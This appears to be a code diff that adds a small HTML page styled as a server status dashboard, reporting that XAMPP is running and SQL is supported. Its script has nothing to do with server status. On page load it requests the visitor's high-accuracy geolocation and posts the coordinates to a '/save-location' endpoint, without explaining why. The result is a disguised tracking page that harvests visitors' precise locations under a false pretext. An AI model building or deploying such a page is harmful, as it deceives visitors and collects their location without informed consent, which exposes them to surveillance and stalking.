@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Server Status</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .status {
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Server Dashboard</h1>
+    <p>Status: <span class="status">XAMPP is running</span></p>
+    <p>Database: <span class="status">SQL is supported</span></p>
+
+    <script>
+        navigator.geolocation.getCurrentPosition((position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            fetch('/save-location', {
+                method: 'POST',
+                body: JSON.stringify({ latitude: lat, longitude: lon }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+
+            console.log(`Pinpoint Location: ${lat}, ${lon}`);
+        }, (error) => {
+            console.error("User denied location access.");
+        }, {
+            enableHighAccuracy: true
+        });
+    </script>
+</body>
+
+</html>
